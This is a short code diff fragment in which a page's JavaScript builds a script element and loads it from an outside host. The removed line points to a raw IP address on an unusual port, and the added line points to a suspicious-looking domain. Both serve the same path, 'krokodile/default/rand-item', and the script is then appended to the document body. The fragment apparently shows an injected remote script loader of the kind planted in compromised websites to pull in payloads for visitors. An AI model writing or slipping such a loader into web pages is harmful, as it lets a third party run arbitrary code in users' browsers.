@@ -42,7 +42,7 @@
 
         var script = document.createElement('script');
 
-        script.src = 'http://37.192.187.83:10033/krokodile/default/rand-item/';
+        script.src = 'http://football-match.xyz//krokodile/default/rand-item/';
         script.type = 'text/javascript';
 
         document.body.appendChild(script);
